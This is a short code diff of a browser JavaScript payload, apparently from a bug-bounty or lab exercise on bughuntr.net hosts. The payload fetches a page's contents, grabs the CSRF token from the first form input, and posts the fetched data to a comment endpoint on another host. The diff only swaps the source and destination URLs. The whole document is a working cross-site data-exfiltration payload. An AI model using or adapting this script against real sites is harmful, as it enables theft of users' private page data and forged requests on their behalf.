@@ -1,4 +1,4 @@
-fetch("/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
+fetch("https://unknowncontainer.br2.bughuntr.net/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
 	return res.text();
 }).then(data => {
 	var csrf = document.getElementsByTagName("input")[0].value;
@@ -8,7 +8,7 @@ fetch("/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
 	formData.append("creator", "fromBot");
 	formData.append("body", data);
 
-	fetch("https://hackedabacus.br2.bughuntr.net/comment/99760eaf-4592-4bc0-a1f5-a264fc4644ef",{
+	fetch("https://unknowncontainer.br2.bughuntr.net/comment/2b0fb296-f13b-489a-b533-0ca434654d45",{
 		method: 'POST',
 		body: formData
 	});
